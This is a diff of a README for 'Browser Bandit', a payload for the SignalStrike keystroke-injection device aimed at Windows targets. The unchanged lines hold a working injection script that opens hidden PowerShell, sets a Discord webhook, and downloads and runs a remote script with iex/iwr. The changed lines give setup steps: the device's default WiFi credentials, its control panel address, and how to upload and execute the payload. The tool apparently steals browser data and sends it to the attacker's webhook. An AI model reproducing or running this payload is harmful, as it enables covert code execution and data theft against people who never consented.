@@ -2,7 +2,7 @@
 
 ## Requirements:
 
-- **Hardware**: Code-382 SignalStrike ([store]([https://store-link-here](https://code-382.eu/index.php/product/signalstrike/)))
+- **Hardware**: Code-382 SignalStrike ([store](https://code-382.eu/index.php/product/signalstrike/))
 - **Attacker**: Windows/Linux/MacOS/Android/iOS with Discord installed
 - **Target**: Windows 7/10/11
 
@@ -41,14 +41,13 @@ STRING $webhook = '<DISCORD WEBHOOK HERE>'
 ENTER
 SPACE
 STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
-ENTER```
+ENTER
 
+3. Upload Your Payload to SignalStrike
 
-## 3. Upload Your Payload to SignalStrike
-
-1. Plug in your SignalStrike device.
-2. Connect to its WiFi network (**Default SSID: SignalStrike, Password: SignalStrike**).
-3. Open a web browser and go to **192.168.4.1** to access the control panel.
-4. Create a new payload and name it "Browser Bandit".
-5. Paste your modified `Payload.txt` (with the webhook) into the text box provided.
-6. Save the payload and execute it.
+    Plug in your SignalStrike device.
+    Connect to its WiFi network (Default SSID: SignalStrike, Password: SignalStrike).
+    Open a web browser and go to 192.168.4.1 to access the control panel.
+    Create a new payload and name it "Browser Bandit".
+    Paste your modified Payload.txt (with the webhook) into the text box provided.
+    Save the payload and execute it.
